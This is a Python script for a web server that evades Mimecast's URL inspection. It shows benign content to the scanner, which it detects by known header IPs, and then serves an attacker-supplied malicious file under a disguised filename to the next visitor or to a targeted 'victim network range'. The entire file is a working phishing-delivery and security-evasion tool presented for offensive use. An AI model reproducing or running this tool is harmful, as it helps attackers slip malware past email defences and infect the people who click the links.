#!/usr/bin/python3

## Thank you stackoverflow:
## https://stackoverflow.com/a/62482117
## https://stackoverflow.com/a/52046062

import os
import sys
import ssl
import argparse
import logging
import ipaddress
import http.server
from http.server import HTTPServer
from http.server import ThreadingHTTPServer
from functools import partial

malicious = 0
logger = logging.getLogger('MrMimecast')
logger.setLevel(logging.DEBUG)

class h:
    g = '\033[92m'
    r = '\033[91m'
    b = '\033[94m'
    t = '\033[96m'
    w = '\033[1m'
    e = '\033[0m'
    h = '\033[95m'
    v = '\033[93m'
    B = '\033[1m'
    u = '\033[4m'

class MimecastHttpRequestHandler(http.server.BaseHTTPRequestHandler):
    def __init__(self, default, replace, mask, network, *args, **kwargs):
        self.default = default
        self.replace = replace
        self.mask = mask

        self.network = network

        super().__init__(*args, **kwargs)

    ## Check if visiting IP falls within the provided network range
    def check_source(self, network, source):
        for subnet in network:
            if ipaddress.ip_address(source) in ipaddress.ip_network(subnet):
                return True
    ## /Check if visiting IP falls within the provided network range

    def do_GET(self):
        global malicious

        filename = self.mask
        replacefile = open(self.replace, 'rb')
        defaultfile = open(self.default, 'rb')

        ## Known Mimecast TTP headers (defunct)
        mimecast = ['x-client: 135.125.122.65', 'x-client-ip: 135.125.122.65',
            'x-real-ip: 135.125.122.65', 'x-client: 163.172.240.97', 'x-client-ip: 163.172.240.97',
            'x-real-ip: 163.172.240.97']
        ## /Known Mimecast TTP headers (defunct)

        reqheaders = str(self.headers)
        logheaders = reqheaders.replace('\n', ',')

        ## Check if visiting IP falls within the provided network range
        if self.network:
            source = self.address_string()
            check_source = self.check_source(self.network, source)

        else:
            check_source = False
        ## /Check if visiting IP falls within the provided network range

        mimeheader = any(header in reqheaders for header in mimecast)

        self.send_response(200)
        self.send_header('Cache-Control', 'no-store, must-revalidate')
        self.send_header('Expires', '0')
        self.end_headers()

        ## If the visitor falls within the designated range
        ## Or the page was previously scanned by Mimecast
        ## Serve the payload
        if (malicious == 1 and mimeheader is False) or check_source is True:
            print(f'{h.r}[*] DEPLOYING PAYLOAD{h.e}\n')
            logger.info(f'Incoming request: {self.address_string()} - {self.requestline}')
            logger.debug(f'Request headers: {logheaders}')
            logger.info(f'Payload deployed to {self.address_string()}')
            content = replacefile
            self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
            self.wfile.write(content.read())
            malicious = 0

        ## Otherwise, return the default page
        else:
            print(f'{h.g}[*] SERVING DEFAULT CONTENT{h.e}\n')
            logger.info(f'Incoming request: {self.address_string()} - {self.requestline}')
            logger.debug(f'Request headers: {logheaders}')
            content = defaultfile
            self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
            self.wfile.write(content.read())

        ## If Mimecast scans the page
        ## Serve the payload to the very next visitor
        if mimeheader is True:
            print(f'{h.h}[*] MIMECAST HEADER DETECTED. MODIFYING NEXT RESPONSE.{h.e}\n')
            logger.info(f'Incoming request: {self.address_string()} - {self.requestline}')
            logger.debug(f'Request headers: {logheaders}')
            logger.info(f'Mimecast Detected: Modifying next response')
            malicious = 1

        ## After the payload is deployed
        ## Reset back to serving default content
        else:
            malicious = 0

## Verify address or CIDR range is valid
def check_network(network):
    try:
        ip_object = ipaddress.ip_network(subnet)
        print(f'{h.b}NETWORK TRIGGER:{h.e}\t{h.v}{subnet}{h.e}')

    except:
        print(f'[ERROR] Network range invalid: {subnet}')
        sys.exit(1)
## /Verify address or CIDR range is valid

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Mimecast Targeted Threat Protection / URL inspection evasion tool.')
    web = parser.add_argument_group('Web server configuration')
    ip = web.add_argument('-i', '--ip', type=str, default='0.0.0.0', help='Listening interface [Default: 0.0.0.0]')
    port = web.add_argument('-p', '--port', default=80, type=int, help='Listening port [Default: 80]')
    tls = web.add_argument('--tls', action='store_true', help='Enable SSL/TLS')
    cert = web.add_argument('-c', '--cert', type=str, help='TLS certificate (.pem)')
    key = web.add_argument('-k', '--key', type=str, help='TLS key (.pem)')
    output = web.add_argument('-o', '--output', type=str, help='Save web logs to file')

    rules = parser.add_argument_group('Evasion rulesets')
    network = rules.add_argument('-n', '--network', action='append', type=str, help='Victim network range [Single IP or CIDR notation]')

    files = parser.add_argument_group('Web content')
    default = files.add_argument('-d', '--default', type=str, required=True, help='Path to default web content')
    replace = files.add_argument('-r', '--replace', type=str, required=True, help='Path to replacement / malicious file')
    mask = files.add_argument('-m', '--mask', type=str, required=True, help='Filename shown to visitors')

    args = parser.parse_args()

    ## Do these files exist?
    requiredfiles = [args.default, args.replace]

    if args.output:
        fh = logging.FileHandler(args.output)
        fh.setLevel(logging.DEBUG)
        formatter = logging.Formatter('{asctime} - {name} - {levelname} - {message}', style='{')
        fh.setFormatter(formatter)
        logger.addHandler(fh)

    if args.tls:
        requiredfiles.append(args.cert)
        requiredfiles.append(args.key)

    for x in requiredfiles:
        if os.path.isfile(x):
            pass
        else:
            print(f'[ERROR] File not found: {x}')
            sys.exit(1)
    ## /Do these files exist?

    print(f'{h.b}LISTENER:{h.e}\t\t{h.v}{args.ip}:{args.port}{h.e}\n')
    print(f'{h.b}DEFAULT CONTENT:{h.e}\t{h.g}{args.default}{h.e}\n{h.b}REPLACEMENT:{h.e}\t\t{h.r}{args.replace}{h.e}\n{h.b}VISIBLE FILENAME:{h.e}\t{h.h}{args.mask}{h.e}\n')

    ## Verify address or CIDR range is valid
    if args.network:
        for subnet in args.network:
            check_network(subnet)
    ## /Verify address or CIDR range is valid

    handler = partial(MimecastHttpRequestHandler, args.default, args.replace, args.mask, args.network)
    httpd = ThreadingHTTPServer((args.ip, args.port), handler)

    if args.tls is True:
        httpd.socket = ssl.wrap_socket(httpd.socket, keyfile=args.key, certfile=args.cert, server_side=True)

    print('\n')
    print(f' {h.u}                             {h.e}')
    print(f'|    {h.u}MR.MIME USED REFLECT{h.e}     |')
    print(f'|{h.u}                             {h.e}|')
    print('\n')
    print(f'{h.v}Waiting for visitors...{h.e}\n')

    logger.info(f'Starting New Listener: {args.ip}:{args.port}')

    httpd.serve_forever()
